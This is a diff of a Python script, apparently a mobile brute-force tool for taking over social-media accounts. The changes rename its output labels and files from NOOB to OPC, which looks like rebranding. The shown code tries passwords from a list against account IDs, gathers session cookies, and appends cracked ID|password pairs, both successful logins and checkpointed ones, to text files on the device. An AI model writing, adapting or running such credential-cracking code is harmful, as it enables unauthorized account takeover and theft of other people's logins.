@@ -296,15 +296,15 @@ def mmm(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				
-				print('\033[1;92m[NOOB-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/NOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[OPC-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/OPC-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					
-					print('\33[1;31m[NOOB-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;31m[OPC-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/OPC-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -369,15 +369,15 @@ def ffb(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				
-				print('\033[1;92m[NOOB-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/NOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[OPC-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/OPC-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					
-					print('\33[1;31m[NOOB-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;31m[OPC-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/OPC-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
